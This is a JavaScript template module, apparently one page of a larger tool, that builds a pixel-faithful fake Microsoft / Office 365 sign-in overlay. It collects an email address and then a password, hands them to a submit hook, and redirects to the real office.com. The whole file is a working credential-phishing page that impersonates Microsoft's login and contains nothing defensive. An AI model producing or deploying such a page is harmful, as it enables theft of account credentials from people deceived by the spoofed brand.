// Microsoft / Office 365 sign-in overlay. Authentic two-step flow
// (email -> password), square buttons, Segoe UI, four-square logo.
module.exports = {
  id: 'microsoft',
  label: 'Microsoft',
  blurb: 'Microsoft / Office 365 two-step sign-in',

  css: `
  .ms-card{width:440px;max-width:100%;background:#fff;
    box-shadow:0 2px 6px rgba(0,0,0,.18);padding:44px;
    font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;color:#1b1b1b}
  .ms-logo{display:flex;align-items:center;gap:6px;margin-bottom:16px}
  .ms-logo .sq{display:grid;grid-template-columns:repeat(2,9px);grid-template-rows:repeat(2,9px);gap:2px}
  .ms-logo .sq i{display:block;width:9px;height:9px}
  .ms-logo .sq i:nth-child(1){background:#f25022}
  .ms-logo .sq i:nth-child(2){background:#7fba00}
  .ms-logo .sq i:nth-child(3){background:#00a4ef}
  .ms-logo .sq i:nth-child(4){background:#ffb900}
  .ms-logo span{font-size:15px;color:#5e5e5e;font-weight:600}
  .ms-back{font-size:13px;color:#1b1b1b;text-decoration:none;display:inline-flex;align-items:center;gap:6px;margin-bottom:12px;visibility:hidden}
  .ms-h1{font-size:24px;font-weight:600;margin:0 0 12px}
  .ms-acct{font-size:15px;margin:0 0 12px;color:#1b1b1b}
  .ms-card input{width:100%;height:36px;border:none;border-bottom:1px solid #666;
    font-size:15px;outline:none;padding:0 2px;color:#1b1b1b;background:transparent}
  .ms-card input:focus{border-bottom:2px solid #0067b8}
  .ms-link{display:block;font-size:13px;color:#0067b8;text-decoration:none;margin:14px 0}
  .ms-link:hover{text-decoration:underline}
  .ms-row{display:flex;justify-content:flex-end;margin-top:20px}
  .ms-btn{min-width:108px;height:32px;border:none;background:#0067b8;color:#fff;
    font-size:15px;font-family:inherit;cursor:pointer}
  .ms-btn:hover{background:#005da6}
  .ms-step.hide{display:none}
  `,

  html: `
  <div class="ms-card" data-wr-card>
    <div class="ms-logo"><span class="sq"><i></i><i></i><i></i><i></i></span><span>Microsoft</span></div>

    <a href="#" class="ms-back" data-ms-back onclick="return false">&#8592; <span data-ms-acct></span></a>

    <div class="ms-step" data-ms-step="1">
      <div class="ms-h1">Sign in</div>
      <input name="email" type="email" placeholder="Email, phone, or Skype" autocomplete="username" />
      <a class="ms-link" href="#" onclick="return false">No account? Create one!</a>
      <a class="ms-link" href="#" onclick="return false">Can't access your account?</a>
      <div class="ms-row"><button type="button" class="ms-btn" data-ms-next>Next</button></div>
    </div>

    <div class="ms-step hide" data-ms-step="2">
      <div class="ms-h1">Enter password</div>
      <input name="password" type="password" placeholder="Password" autocomplete="current-password" />
      <a class="ms-link" href="#" onclick="return false">Forgot password?</a>
      <div class="ms-row"><button type="button" class="ms-btn" data-wr-submit data-wr-redirect="https://www.office.com/">Sign in</button></div>
    </div>
  </div>
  `,

  script: `
    var step1=root.querySelector('[data-ms-step="1"]');
    var step2=root.querySelector('[data-ms-step="2"]');
    var back=root.querySelector('[data-ms-back]');
    var acct=root.querySelector('[data-ms-acct]');
    var email=root.querySelector('input[name=email]');
    var pass=root.querySelector('input[name=password]');
    var next=root.querySelector('[data-ms-next]');
    function show2(){
      if(!email.value){ email.focus(); return; }
      acct.textContent=email.value;
      back.style.visibility='visible';
      step1.classList.add('hide'); step2.classList.remove('hide');
      setTimeout(function(){ pass.focus(); },30);
    }
    function show1(){
      back.style.visibility='hidden';
      step2.classList.add('hide'); step1.classList.remove('hide');
      setTimeout(function(){ email.focus(); },30);
    }
    next.addEventListener('click',show2);
    email.addEventListener('keydown',function(e){ if(e.key==='Enter') show2(); });
    back.addEventListener('click',show1);
    setTimeout(function(){ email.focus(); },50);
  `
};
